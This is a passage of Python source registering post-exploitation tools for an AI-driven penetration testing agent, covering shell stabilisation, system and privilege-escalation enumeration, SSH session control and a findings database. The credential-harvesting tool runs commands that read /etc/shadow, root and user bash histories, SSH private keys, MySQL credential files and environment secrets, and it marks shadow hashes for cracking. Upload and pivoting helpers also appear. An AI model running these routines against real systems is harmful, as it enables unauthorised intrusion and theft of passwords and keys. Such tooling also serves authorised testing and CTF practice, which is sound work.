            "export TERM=xterm-256color",
            "export SHELL=/bin/bash",
            "stty rows 50 cols 200 2>/dev/null || true",
        ]
        for cmd in stabilization_cmds:
            try:
                await client.post("/api/session/send", {
                    "session_id": session_id, "command": cmd,
                    "wait_for": "", "read_timeout": 3.0
                })
                await asyncio.sleep(0.5)
            except Exception:
                pass
        return True

    @mcp.tool(name="post_enum_system")
    async def post_enum_system(session_id: str) -> Dict:
        """
        Run automated system enumeration on an active shell session.
        Collects: users, hostname, kernel, network interfaces, running processes,
                  open ports, cron jobs, mounted filesystems.
        Returns structured data parsed from shell output.

        Args:
            session_id: Active session ID (netcat, msfconsole, ssh, direct_shell)
        NOTE: Session must be a shell (netcat/direct_shell/socat/ssh), NOT msfconsole.
              For MSF sessions, use msf_session_interact() to get a shell first.
              SSH sessions are auto-detected and run through the ssh_exec() API.
        """
        console.print(f"[bold cyan]🔍 Enumerating system...[/] (session {session_id})")

        # SSH sessions use a different API
        ssh_list = await client.get("/api/ssh/list")
        ssh_sessions = [s["id"] for s in ssh_list.get("sessions", [])]
        is_ssh = session_id in ssh_sessions
        
        if is_ssh:
            console.print(f"[dim]Detected SSH session — using ssh_exec() API[/]")
            all_commands = """
echo "=== IDENTITY ===" && id && whoami && hostname &&
echo "=== KERNEL ===" && uname -a &&
echo "=== USERS ===" && cat /etc/passwd | wc -l &&
echo "=== PASSWD ===" && cat /etc/passwd &&
echo "=== NETWORK ===" && (ip addr show 2>/dev/null || ifconfig 2>/dev/null) &&
echo "=== LISTENING PORTS ===" && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) &&
echo "=== PROCESSES ===" && ps aux 2>/dev/null | head -20 &&
echo "=== CRON ===" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null &&
echo "=== DISK ===" && df -h 2>/dev/null
"""
            r = await client.post("/api/ssh/exec", {
                "session_id": session_id,
                "command": all_commands,
                "timeout": 30
            })
            
            raw_output = r.get("stdout", "")
            if not raw_output or not raw_output.strip():
                return {
                    "session_id": session_id,
                    "session_type": "ssh",
                    "raw_output": raw_output,
                    "diagnostic": "empty_ssh_output",
                    "suggestion": "SSH session returned empty output. Check if the session is still alive with ssh_exec(session_id, 'id')",
                }
            
            # Parse the structured output
            parsed = {
                "session_id": session_id,
                "session_type": "ssh",
                "raw_output": raw_output,
            }
            
            # Extract identity
            if "IDENTITY" in raw_output:
                id_section = raw_output.split("=== IDENTITY ===")[1].split("===")[0] if "=== IDENTITY ===" in raw_output else ""
                parsed["identity"] = id_section.strip()[:200]
                if "root" in id_section or "uid=0" in id_section:
                    parsed["is_root"] = True
                    console.print("[bold green]🔑 Running as ROOT![/]")
            
            # Extract kernel
            if "KERNEL" in raw_output:
                kernel_section = raw_output.split("=== KERNEL ===")[1].split("===")[0] if "=== KERNEL ===" in raw_output else ""
                parsed["kernel"] = kernel_section.strip()[:200]
            
            # Extract user count
            if "PASSWD" in raw_output:
                passwd_section = raw_output.split("=== PASSWD ===")[1].split("===")[0] if "=== PASSWD ===" in raw_output else ""
                users = [l.split(":")[0] for l in passwd_section.strip().splitlines() if l.strip() and ":" in l]
                parsed["users"] = users
                parsed["user_count"] = len(users)
                console.print(f"[green]Found {len(users)} users[/]")
            
            # Extract listening ports
            if "LISTENING PORTS" in raw_output:
                ports_section = raw_output.split("=== LISTENING PORTS ===")[1].split("===")[0] if "=== LISTENING PORTS ===" in raw_output else ""
                ports = list(set(re.findall(r':(\d+)', ports_section)))
                parsed["listening_ports"] = ports[:20]
            
            return parsed

        # PTY session logic (original code for netcat/meterpreter/etc)
        # msfconsole sessions need a shell first
        status = await client.get(f"/api/session/{session_id}/status")
        if "error" not in status:
            stype = status.get("type", "")
            if stype == "msfconsole":
                console.print(f"[yellow]⚠️  Session {session_id} is a msfconsole session, not a shell.[/]")
                console.print("[yellow]Use msf_session_interact() to open a shell session first, then pass that session_id.[/]")
                return {
                    "session_id": session_id,
                    "error": "Session is msfconsole, not a shell",
                    "diagnostic": "wrong_session_type",
                    "suggestion": "Use msf_session_interact(msf_sid, session_num, ['shell']) to get a shell, then run post_enum_system on that shell session.",
                }

        # Many reverse shells are "dumb" — try to upgrade to a PTY first
        console.print("[dim]Attempting shell stabilization...[/]")
        if not await _try_stabilize_shell(session_id):
            console.print("[red]❌ Session is not responding — aborting enumeration[/]")
            return {
                "session_id": session_id,
                "diagnostic": "session_unresponsive",
                "suggestion": "The session did not respond to a liveness probe. It may be dead — check with session_status(), re-establish the shell, then retry.",
            }

        # avoid || chains — some shells don't support them; run variants instead
        cmd_groups = [
            # Group 1: Identity (basic -- should always work)
            ["id", "whoami", "hostname"],
            # Group 2: System info
            ["uname -a", "cat /proc/version 2>/dev/null"],
            # Group 3: Users
            ["cat /etc/passwd"],
            # Group 4: Network (try multiple variants)
            ["ip addr show 2>/dev/null", "ifconfig 2>/dev/null", "netstat -an 2>/dev/null"],
            # Group 5: Listening ports
            ["ss -tlnp 2>/dev/null", "netstat -tlnp 2>/dev/null"],
            # Group 6: Processes
            ["ps aux 2>/dev/null | head -30", "ps -ef 2>/dev/null | head -30"],
            # Group 7: Cron jobs
            ["ls -la /etc/cron.d/ 2>/dev/null", "cat /etc/crontab 2>/dev/null"],
            # Group 8: Disk usage
            ["df -h 2>/dev/null"],
        ]

        # FIX: Increase read timeout — commands like ps/ss may take a moment
        # Run one command from each group (first that produces output wins)
        # FIX: per-command output windowed — cat /etc/passwd / netstat dumps
        # would otherwise flood the agent context
        results: Dict[str, str] = {}
        for group in cmd_groups:
            for cmd in group:
                r = await client.post("/api/session/send", {
                    "session_id": session_id, "command": cmd,
                    "wait_for": "", "read_timeout": 15.0
                })
                output = r.get("output", "")
                if output and output.strip():
                    if len(output) > 8000:
                        output = (output[:2500] + f"\n…[OMITTED {len(output) - 7500} chars — "
                                  f"re-run with a filter]…\n" + output[-5000:])
                    # Use a clean key for storage (remove redirects)
                    clean_key = cmd.replace(" 2>/dev/null", "").replace(" | head -30", "").strip()
                    if clean_key not in results:
                        results[clean_key] = output
                    break  # Found output for this group, move to next

        # surface empty results with diagnostics
        all_empty = all(not v or not v.strip() for v in results.values())
        if all_empty:
            console.print(f"[yellow]⚠️  post_enum_system: all commands returned empty output[/]")
            console.print("[dim]Possible causes:[/]")
            console.print("  1. Shell is not fully interactive (dumb shell without PTY)")
            console.print("  2. Session disconnected or shell process died")
            console.print("  3. Commands are not being echoed/executed by the shell")
            console.print("[yellow]Suggestions:[/]")
            console.print("  1. Run: session_upgrade_shell(session_id) to get full PTY")
            console.print("  2. Check: session_status(session_id) to verify shell is alive")
            console.print("  3. Try: session_send(session_id, 'id', read_timeout=10) to test manually")
            return {
                "session_id": session_id,
                "raw": results,
                "diagnostic": "empty_data",
                "stabilization_attempted": True,
                "suggestion": "Run session_upgrade_shell(session_id) to stabilize the shell, then retry. If still empty, the shell may be non-functional.",
            }

        # Parse structured data
        parsed = {"raw": results, "stabilization_attempted": True, "session_type": "pty"}

        # Extract users
        passwd = results.get("cat /etc/passwd", "")
        if passwd and passwd.strip():
            users = [l.split(":")[0] for l in passwd.strip().splitlines() if l.strip()]
            parsed["users"] = users
            console.print(f"[green]Found {len(users)} users[/]")

        # Extract listening ports
        for net_key in ["ss -tlnp", "netstat -tlnp", "netstat -an"]:
            net_out = results.get(net_key, "")
            if net_out:
                ports = re.findall(r':(\d+)', net_out)
                if ports:
                    parsed["listening_ports"] = list(set(ports))
                    break

        # Extract hostname/identity
        id_out = results.get("id", "") + " " + results.get("whoami", "")
        if id_out.strip():
            parsed["identity"] = (results.get("id", "") + " " + results.get("whoami", "") + " @ " + results.get("hostname", "")).strip()[:200]
            if "root" in id_out or "uid=0" in id_out:
                parsed["is_root"] = True
                console.print("[bold green]🔑 Running as ROOT![/]")

        # Kernel version
        uname_out = results.get("uname -a", "")
        if uname_out:
            parsed["kernel"] = uname_out.strip()

        return {"session_id": session_id, **parsed}

    @mcp.tool(name="post_enum_privesc")
    async def post_enum_privesc(session_id: str) -> Dict:
        """
        Check privilege escalation vectors on an active shell session.
        Checks: sudo -l, SUID binaries, capabilities, writable /etc/passwd,
                kernel version (for known exploits), world-writable files.
        Returns structured data.

        Args:
            session_id: Active session ID (must be a shell session, not msfconsole)
            SSH sessions are auto-detected and run through the ssh_exec() API.
        """
        console.print(f"[bold yellow]🔑 Checking privesc vectors...[/] (session {session_id})")

        # SSH sessions use a different API
        ssh_list = await client.get("/api/ssh/list")
        ssh_sessions = [s["id"] for s in ssh_list.get("sessions", [])]
        is_ssh = session_id in ssh_sessions
        
        if is_ssh:
            console.print(f"[dim]Detected SSH session — using ssh_exec() API[/]")
            all_commands = """
echo "=== SUDO ===" && timeout 5 sudo -l 2>/dev/null || true &&
echo "=== SUID ===" && find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null | head -30 &&
echo "=== CAPABILITIES ===" && getcap -r / 2>/dev/null | head -20 &&
echo "=== PASSWD PERMS ===" && ls -la /etc/passwd /etc/shadow 2>/dev/null &&
echo "=== KERNEL ===" && uname -r &&
echo "=== OS ===" && cat /etc/os-release 2>/dev/null | head -5 &&
echo "=== WRITABLE ===" && find /tmp /var/tmp -writable -type f 2>/dev/null | head -20
"""
            r = await client.post("/api/ssh/exec", {
                "session_id": session_id,
                "command": all_commands,
                "timeout": 30
            })
            
            raw_output = r.get("stdout", "")
            if not raw_output or not raw_output.strip():
                return {
                    "session_id": session_id,
                    "session_type": "ssh",
                    "raw_output": raw_output,
                    "diagnostic": "empty_ssh_output",
                    "suggestion": "SSH session returned empty output. Check if the session is still alive with ssh_exec(session_id, 'id')",
                }
            
            # Parse the structured output
            parsed = {
                "session_id": session_id,
                "session_type": "ssh",
                "raw_output": raw_output,
            }
            
            # Parse sudo
            if "SUDO" in raw_output:
                sudo_section = raw_output.split("=== SUDO ===")[1].split("===")[0] if "=== SUDO ===" in raw_output else ""
                # FIX: '(ALL)' alone is a false positive — sudo -l output also
                # prints warning text containing those chars. Only a real rule
                # line '    (ALL) ALL' / '(ALL:ALL) NOPASSWD: ALL' counts.
                sudo_nopass_lines = re.findall(r"^\s*\([^)]*\)\s+NOPASSWD[^\n]*", sudo_section, re.MULTILINE)
                sudo_all_lines = re.findall(r"^\s*\([^)]*\)\s+(?:(?:NOPASSWD|PASSWD):\s*)?ALL\b[^\n]*", sudo_section, re.MULTILINE)
                if sudo_nopass_lines:
                    parsed["sudo_nopass"] = [l.strip() for l in sudo_nopass_lines]
                    console.print(f"[bold red]🚨 NOPASSWD sudo found![/]")
                if sudo_all_lines:
                    parsed["sudo_all"] = [l.strip() for l in sudo_all_lines]
            
            # Parse SUID
            if "SUID" in raw_output:
                suid_section = raw_output.split("=== SUID ===")[1].split("===")[0] if "=== SUID ===" in raw_output else ""
                suid_bins = [l.strip() for l in suid_section.splitlines() if l.strip() and "/" in l]
                if suid_bins:
                    parsed["suid_binaries"] = suid_bins
                    console.print(f"[yellow]Found {len(suid_bins)} SUID binaries[/]")
            
            # Parse kernel
            if "KERNEL" in raw_output:
                kernel_section = raw_output.split("=== KERNEL ===")[1].split("===")[0] if "=== KERNEL ===" in raw_output else ""
                parsed["kernel"] = kernel_section.strip()[:100]
            
            return parsed

        # PTY session logic (original code)
        # msfconsole sessions need a shell first
        status = await client.get(f"/api/session/{session_id}/status")
        if "error" not in status and status.get("type") == "msfconsole":
            console.print(f"[yellow]⚠️  Session is msfconsole, not a shell. Use msf_session_interact() first.[/]")
            return {
                "session_id": session_id,
                "diagnostic": "wrong_session_type",
                "suggestion": "Use msf_session_interact() to open a shell, then run post_enum_privesc on that session.",
            }

        # try to upgrade a dumb shell to a PTY first
        console.print("[dim]Attempting shell stabilization...[/]")
        if not await _try_stabilize_shell(session_id):
            console.print("[red]❌ Session is not responding — aborting privesc enum[/]")
            return {
                "session_id": session_id,
                "diagnostic": "session_unresponsive",
                "suggestion": "The session did not respond to a liveness probe. It may be dead — re-establish the shell, then retry.",
            }

        # grouped commands with fallbacks — no || chains (some shells lack them)
        cmd_groups = [
            # sudo privileges
            ["sudo -l 2>/dev/null", "sudo -k -l 2>/dev/null"],
            # SUID binaries (can be slow, so we try targeted locations first)
            ["find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
             "find / -perm -4000 -type f 2>/dev/null"],
            # Capabilities
            ["getcap -r / 2>/dev/null", "cat /proc/sys/kernel/cap_last_cap 2>/dev/null"],
            # Password files
            ["ls -la /etc/passwd /etc/shadow 2>/dev/null", "ls -la /etc/passwd 2>/dev/null"],
            # Kernel version
            ["uname -r", "uname -a"],
            # OS info
            ["cat /etc/os-release 2>/dev/null", "cat /etc/issue 2>/dev/null"],
            # World-writable files (targeted first for speed)
            ["find /tmp /var/tmp -writable -type f 2>/dev/null | head -20",
             "find / -writable -type f 2>/dev/null | head -20"],
        ]

        # Run one command from each group
        # FIX: window per-command output — find / -writable dumps are huge
        results: Dict[str, str] = {}
        for group in cmd_groups:
            for cmd in group:
                r = await client.post("/api/session/send", {
                    "session_id": session_id, "command": cmd,
                    "wait_for": "", "read_timeout": 30.0
                })
                output = r.get("output", "")
                if output and output.strip():
                    if len(output) > 8000:
                        output = (output[:2500] + f"\n…[OMITTED {len(output) - 7500} chars — "
                                  f"re-run with a filter]…\n" + output[-5000:])
                    clean_key = cmd.replace(" 2>/dev/null", "").replace(" | head -20", "").strip()
                    if clean_key not in results:
                        results[clean_key] = output
                    break

        # surface empty results with diagnostics
        all_empty = all(not v or not v.strip() for v in results.values())
        if all_empty:
            console.print(f"[yellow]⚠️  post_enum_privesc: all commands returned empty — shell may need upgrade[/]")
            console.print("[dim]The shell may not be executing commands. Try:[/]")
            console.print("  1. session_upgrade_shell(session_id) for PTY")
            console.print("  2. session_send(session_id, 'id', read_timeout=10) to test")
            return {
                "session_id": session_id,
                "raw": results,
                "diagnostic": "empty_data",
                "stabilization_attempted": True,
                "suggestion": "Run session_upgrade_shell(session_id) to get a proper PTY, then retry.",
            }

        parsed = {"raw": results, "stabilization_attempted": True, "session_type": "pty"}

        # Parse sudo -l
        sudo_out = results.get("sudo -l", "") + results.get("sudo -k -l", "")
        # FIX: real rules only — bare '(ALL)'/'ALL' substring matches the
        # warning banner text too (false-positive 'sudo_all' on every host).
        sudo_nopass_lines = re.findall(r"^\s*\([^)]*\)\s+NOPASSWD[^\n]*", sudo_out, re.MULTILINE)
        sudo_all_lines = re.findall(r"^\s*\([^)]*\)\s+(?:(?:NOPASSWD|PASSWD):\s*)?ALL\b[^\n]*", sudo_out, re.MULTILINE)
        if sudo_nopass_lines:
            parsed["sudo_nopass"] = [l.strip() for l in sudo_nopass_lines]
            console.print(f"[bold red]🚨 NOPASSWD sudo found! {parsed['sudo_nopass']}[/]")
        if sudo_all_lines:
            parsed["sudo_all"] = [l.strip() for l in sudo_all_lines]

        # Parse SUID binaries
        for suid_key in ["find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f",
                         "find / -perm -4000 -type f"]:
            suid_out = results.get(suid_key, "")
            if suid_out and suid_out.strip():
                suid_bins = [l.strip() for l in suid_out.strip().splitlines() if l.strip()]
                parsed["suid_binaries"] = suid_bins
                console.print(f"[yellow]Found {len(suid_bins)} SUID binaries[/]")
                break

        # Kernel
        kernel = results.get("uname -r", "").strip() or results.get("uname -a", "").strip()
        parsed["kernel"] = kernel
        if kernel:
            console.print(f"[cyan]Kernel:[/] {kernel}")

        return {"session_id": session_id, **parsed}

    @mcp.tool(name="post_harvest_creds")
    async def post_harvest_creds(session_id: str) -> Dict:
        """
        Search for credentials on an active shell session.
        Checks: /etc/shadow, bash history, SSH keys, config files,
                common credential locations, database configs.
        Returns structured credential findings.

        Args:
            session_id: Active session ID (must be a shell session, not msfconsole)
            SSH sessions are auto-detected and run through the ssh_exec() API.
        """
        console.print(f"[bold red]🔑 Harvesting credentials...[/] (session {session_id})")

        # SSH sessions use a different API
        ssh_list = await client.get("/api/ssh/list")
        ssh_sessions = [s["id"] for s in ssh_list.get("sessions", [])]
        is_ssh = session_id in ssh_sessions
        
        if is_ssh:
            console.print(f"[dim]Detected SSH session — using ssh_exec() API[/]")
            all_commands = """
echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null &&
echo "=== ROOT HISTORY ===" && cat /root/.bash_history 2>/dev/null | tail -20 &&
echo "=== USER HISTORY ===" && cat ~/.bash_history 2>/dev/null | tail -20 &&
echo "=== SSH KEYS ===" && find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null &&
echo "=== CONFIG FILES ===" && find /home -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10 &&
echo "=== MYSQL CREDS ===" && cat /etc/mysql/debian.cnf 2>/dev/null
"""
            r = await client.post("/api/ssh/exec", {
                "session_id": session_id,
                "command": all_commands,
                "timeout": 30
            })
            
            raw_output = r.get("stdout", "")
            parsed = {"session_id": session_id, "session_type": "ssh", "raw_output": raw_output, "credentials_found": []}
            
            # Parse findings
            if "SHADOW" in raw_output and "root:" in raw_output:
                parsed["shadow_accessible"] = True
                parsed["credentials_found"].append("shadow_file")
                console.print(f"[bold red]🚨 /etc/shadow is readable![/]")
            
            if "SSH KEYS" in raw_output and "id_rsa" in raw_output:
                parsed["credentials_found"].append("ssh_keys")
                console.print(f"[yellow]Found SSH private keys![/]")
            
            return parsed

        # PTY session logic (original code for netcat/meterpreter/etc)
        # msfconsole sessions need a shell first
        status = await client.get(f"/api/session/{session_id}/status")
        if "error" not in status and status.get("type") == "msfconsole":
            console.print(f"[yellow]⚠️  Session is msfconsole, not a shell. Use msf_session_interact() first.[/]")
            return {
                "session_id": session_id,
                "diagnostic": "wrong_session_type",
                "suggestion": "Use msf_session_interact() to open a shell, then run post_harvest_creds on that session.",
            }

        # try to upgrade a dumb shell to a PTY first
        console.print("[dim]Attempting shell stabilization...[/]")
        if not await _try_stabilize_shell(session_id):
            console.print("[red]❌ Session is not responding — aborting harvest[/]")
            return {
                "session_id": session_id,
                "diagnostic": "session_unresponsive",
                "suggestion": "The session did not respond to a liveness probe. It may be dead — re-establish the shell, then retry.",
            }

        # grouped commands with fallbacks — no ; or || chains
        cmd_groups = [
            # Shadow file
            ["cat /etc/shadow 2>/dev/null"],
            # Root bash history
            ["cat /root/.bash_history 2>/dev/null"],
            # User bash histories
            ['ls -la /home/ 2>/dev/null', 'for d in /home/*/; do cat "$d.bash_history" 2>/dev/null; done'],
            # SSH keys
            ["find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
             "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"],
            # SSH config
            ["grep -i password /etc/ssh/sshd_config 2>/dev/null"],
            # Config files with passwords
            ["find /home -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -10",
             "find / -maxdepth 4 -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10"],
            # Passwords in /etc
            ["grep -ri 'password' /etc/ 2>/dev/null | head -10"],
            # MySQL credentials
            ["cat /etc/mysql/debian.cnf 2>/dev/null", "cat /root/.my.cnf 2>/dev/null"],
            # Env vars with keys
            [r"env 2>/dev/null | grep -i 'key\|token\|pass\|secret' | head -10"],
        ]

        # Run one command from each group
        # FIX: window per-command output — cat /etc/shadow / history dumps
        results: Dict[str, str] = {}
        for group in cmd_groups:
            for cmd in group:
                r = await client.post("/api/session/send", {
                    "session_id": session_id, "command": cmd,
                    "wait_for": "", "read_timeout": 20.0
                })
                output = r.get("output", "")
                if output and output.strip():
                    if len(output) > 8000:
                        output = (output[:2500] + f"\n…[OMITTED {len(output) - 7500} chars — "
                                  f"re-run with a filter]…\n" + output[-5000:])
                    clean_key = cmd.replace(" 2>/dev/null", "").replace(" | head -10", "").strip()
                    if clean_key not in results:
                        results[clean_key] = output
                    break

        # surface empty results with diagnostics
        all_empty = all(not v or not v.strip() for v in results.values())
        if all_empty:
            console.print(f"[yellow]⚠️  post_harvest_creds: all commands returned empty — shell may need upgrade[/]")
            console.print("[dim]The shell may not be executing commands. Try:[/]")
            console.print("  1. session_upgrade_shell(session_id) for PTY")
            console.print("  2. session_send(session_id, 'id', read_timeout=10) to test")
            return {
                "session_id": session_id,
                "raw": results,
                "diagnostic": "empty_data",
                "stabilization_attempted": True,
                "suggestion": "Run session_upgrade_shell(session_id) to stabilize shell, then retry. If still empty, the shell may be non-functional.",
            }

        parsed = {"raw": results, "stabilization_attempted": True}

        # Parse shadow
        shadow = results.get("cat /etc/shadow", "")
        if shadow and ":$" in shadow:
            hashes = [l for l in shadow.strip().splitlines() if ":$" in l]
            parsed["shadow_hashes"] = hashes
            console.print(f"[bold red]🚨 Found {len(hashes)} shadow hash(es)! Save to file and crack with john_crack()[/]")
        elif shadow and "Permission denied" in shadow:
            parsed["shadow_note"] = "Permission denied — need root to read /etc/shadow"

        # Parse SSH keys
        for key_key in ["find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem'",
                        "find / -name 'id_rsa' -o -name 'id_ed25519'"]:
            keys_out = results.get(key_key, "")
            if keys_out and keys_out.strip():
                ssh_keys = [l.strip() for l in keys_out.strip().splitlines() if l.strip()]
                if ssh_keys:
                    parsed["ssh_keys"] = ssh_keys
                    console.print(f"[yellow]🔑 Found {len(ssh_keys)} SSH key file(s)[/]")
                    break

        # Parse bash history for passwords
        # FIX: results are keyed by the CLEANED command (2>/dev/null stripped at
        # store time) — the old lookup used the original strings and always
        # missed the per-user history, silently dropping it.
        history_parts = []
        for hkey in ["cat /root/.bash_history",
                     'for d in /home/*/; do cat "$d.bash_history" 2>/dev/null; done']:
            hkey_clean = hkey.replace(" 2>/dev/null", "").strip()
            hout = results.get(hkey_clean, "") or results.get(hkey, "")
            if hout:
                history_parts.append(hout)
        history = "\n".join(history_parts)
        if history:
            interesting = [l for l in history.splitlines()
                         if any(kw in l.lower() for kw in ["pass", "mysql", "ssh", "ftp", "su ", "sudo"])]
            if interesting:
                parsed["interesting_history"] = interesting[:20]
                console.print(f"[yellow]Found {len(interesting)} interesting history lines[/]")

        return {"session_id": session_id, **parsed}

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # SSH SESSION TOOLS
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="ssh_connect")
    async def ssh_connect(
        host: str,
        username: str,
        password: str = "",
        port: int = 22,
        key_path: str = "",
    ) -> Dict:
        """
        Connect to SSH and create a persistent session.
        Returns a session_id — use ssh_exec to run commands.
        Session stays alive — you can run many commands without reconnecting.
        Host key verification is disabled (CTF-friendly).
        """
        result = await client.post("/api/ssh/connect", {
            "host": host, "port": port, "username": username,
            "password": password, "key_path": key_path
        })
        if result.get("session_id"):
            console.print(f"[green]🔐 SSH connected:[/] {username}@{host}:{port} → session {result['session_id']}")
        return result

    @mcp.tool(name="ssh_exec")
    async def ssh_exec(session_id: str, command: str, timeout: float = 300.0) -> Dict:
        """
        Execute a command in a persistent SSH session.
        Much better than sshpass — the connection is already established.

        For huge outputs (cat big files, find /), pipe through head/grep on
        the remote side — responses are windowed at 16KB (full data is not
        kept elsewhere).

        For privilege escalation: run 'sudo -l', 'find / -perm -4000 2>/dev/null', etc.
        For pivoting: run socat/nc commands to set up tunnels.
        For file operations: use ssh_upload / ssh_download tools.
        """
        result = await client.post("/api/ssh/exec", {
            "session_id": session_id, "command": command, "timeout": timeout
        })
        if result.get("stdout"):
            console.print(f"[dim cyan]$ {command}[/]")
            console.print(result["stdout"][:2000])
        if result.get("stderr") and not result.get("success"):
            console.print(f"[red]{result['stderr'][:500]}[/]")
        return result

    @mcp.tool(name="ssh_exec_interactive")
    async def ssh_exec_interactive(
        session_id: str,
        commands: List[str],
        delay: float = 0.5,
    ) -> Dict:
        """
        Run a sequence of commands on an SSH PTY channel (for su/sudo/passwd flows).
        Sends each command with a delay between them.
        Perfect for: switching users, answering prompts, running menu-based tools.
        """
        return await client.post("/api/ssh/exec_interactive", {
            "session_id": session_id, "commands": commands, "delay": delay
        })

    @mcp.tool(name="ssh_upload")
    async def ssh_upload(
        session_id: str,
        remote_path: str,
        local_path: str = "",
        file_content_b64: str = "",
        file_name: str = "",
    ) -> Dict:
        """Upload a file to remote via SFTP (linpeas, payloads, etc.).

        TWO upload modes:
          1. Path-based:  local_path points to a file already on the Adara server.
                          Use this when you downloaded the file to the server first.
          2. Content-based: file_content_b64 contains the base64-encoded file bytes.
                            Use this to upload directly without first saving to server.

        Args:
            session_id:       SSH session ID from ssh_connect()
            remote_path:      Destination path on the target (e.g., "/tmp/linpeas.sh")
            local_path:       Source file path ON THE ADARA SERVER (mode 1)
            file_content_b64: Base64-encoded file content (mode 2 -- preferred)
            file_name:        Original filename (for logging, when using mode 2)

        Examples:
            # Mode 1: File already on server
            ssh_upload(session_id, "/tmp/linpeas.sh", "/tmp/linpeas.sh")

            # Mode 2: Upload from content (read local file, base64 encode, send)
            # The AI reads the file locally, encodes to base64, passes as file_content_b64
        """
        upload_label = local_path or file_name or "from_content"
        console.print(f"[cyan]📤 Uploading:[/] {upload_label} → {remote_path}")

        if not local_path and not file_content_b64:
            return {
                "error": "Either local_path or file_content_b64 must be provided",
                "suggestion": "Use file_content_b64 with base64-encoded content for direct upload"
            }

        return await client.post("/api/ssh/upload", {
            "session_id": session_id,
            "local_path": local_path,
            "remote_path": remote_path,
            "file_content_b64": file_content_b64,
            "file_name": file_name,
        })

    @mcp.tool(name="ssh_download")
    async def ssh_download(session_id: str, remote_path: str, local_path: str) -> Dict:
        """Download a file from remote via SFTP (flags, config files, etc.)."""
        console.print(f"[cyan]📥 Downloading:[/] {remote_path} → {local_path}")
        return await client.post("/api/ssh/download", {
            "session_id": session_id, "remote_path": remote_path, "local_path": local_path
        })

    @mcp.tool(name="ssh_list")
    async def ssh_list() -> Dict:
        """List all active SSH sessions."""
        result = await client.get("/api/ssh/list")
        sessions = result.get("sessions", [])
        if sessions:
            print_sessions_table(sessions, "SSH Sessions")
        else:
            console.print("[dim]No active SSH sessions[/]")
        return result

    @mcp.tool(name="ssh_close")
    async def ssh_close(session_id: str) -> Dict:
        """Close an SSH session."""
        return await client.delete(f"/api/ssh/{session_id}")

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # FINDINGS / MEMORY
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # NOTE: The full save_finding tool with all parameters is registered below
    # as save_finding_manual (name="save_finding"). This earlier simpler version
    # has been removed to prevent duplicate tool name registration errors in FastMCP.

    @mcp.tool(name="get_findings")
    async def get_findings(target: Optional[str] = None, limit: int = 100, offset: int = 0,
                           include_raw: bool = False) -> Dict:
        """Retrieve findings, optionally filtered by target (paginated).

        Default limit is 100 — keep it low: every finding row costs context.
        raw_output is EXCLUDED by default (raw_len tells you evidence exists);
        set include_raw=True only to drill into a specific finding (each row's
        evidence is windowed to ~4KB). The response also includes
        total + counts_by_severity for cheap re-orientation.
        """
        # FIX (M5): clamp pagination — limit=0/negative or offset<0 previously
        # leaked through to the SQL LIMIT/OFFSET (limit=0 → empty, negative → error).
        # FIX (M7): limit=0 must mean "0 rows" (empty page), not be coerced to 1.
        limit = max(0, min(int(limit), 500))
        offset = max(0, int(offset))
        result = await client.get("/api/findings", **({} if not target else {"target": target}),
                                  **{"limit": limit, "offset": offset, "raw": include_raw})
        findings = result.get("findings", [])
        if findings:
            print_findings_table(findings, f"Findings{f' for {target}' if target else ''}")
        else:
            console.print("[dim]No findings yet[/]")
        sev = result.get("counts_by_severity")
        if sev:
            sev_str = " ".join(f"{k}={v}" for k, v in sorted(sev.items(), key=lambda x: -x[1]))
            console.print(f"[cyan]📊 severity: {sev_str} | total: {result.get('total')}[/]")
        return result

    @mcp.tool(name="get_target_profile")
    async def get_target_profile(host: str, include_raw: bool = False) -> Dict:
        """Get the full profile and all findings for a target.

        include_raw=False (default): finding evidence is omitted (raw_len only)
        so a heavy target can't flood your context. Set include_raw=True to
        read windowed evidence for drill-down."""
        result = await client.get(f"/api/targets/{_urlq(host)}", raw=include_raw)
        tgt  = result.get("target", {})
        fnd  = result.get("findings", [])
        if tgt:
            print_target_profile(tgt, fnd)
        return result

    @mcp.tool(name="read_finding_raw")
    async def read_finding_raw(finding_id: int, offset: int = 0, limit: int = 2000) -> Dict:
        """Page a finding's raw/evidence content through a small window
        (tier-aware: inline or the finding_blobs store). Never returns a huge
        blob in one response — loop this with increasing offset to read long
        evidence, or use the returned truncated flag to know there's more."""
        return await client.get(f"/api/findings/{int(finding_id)}/raw",
                                offset=max(0, int(offset)), limit=max(0, int(limit)))

    @mcp.tool(name="search_findings")
    async def search_findings(query: str, target: str = "", limit: int = 25) -> Dict:
        """Search findings by text across the small indexed fields (title,
        detail, summary, target, tool). Supports partial terms."""
        params = {"q": query, "limit": max(1, min(int(limit), 500))}
        if target:
            params["target"] = target
        return await client.get("/api/findings/search", **params)

    @mcp.tool(name="list_targets")
    async def list_targets() -> Dict:
        """List all known targets in the findings database."""
        result = await client.get("/api/targets")
        targets = result.get("targets", [])
        if targets:
            t = Table(title="Known Targets", box=box.SIMPLE_HEAD, header_style="bold cyan")
            t.add_column("Host", style="cyan")
            t.add_column("OS")
            t.add_column("Open Ports")
            t.add_column("CVEs", style="red")
            t.add_column("Updated")
            for tgt in targets:
                t.add_row(tgt.get("host",""), tgt.get("os_guess","?"),
                          tgt.get("open_ports",""), tgt.get("cves",""),
                          tgt.get("updated_at","")[:16])
            console.print(t)
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # MISSION CONTEXT — the anti-'losing track' toolkit
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="target_note_add")
    async def target_note_add(target: str, note: str) -> Dict:
        """Append a timestamped note to a target's persistent scratchpad.

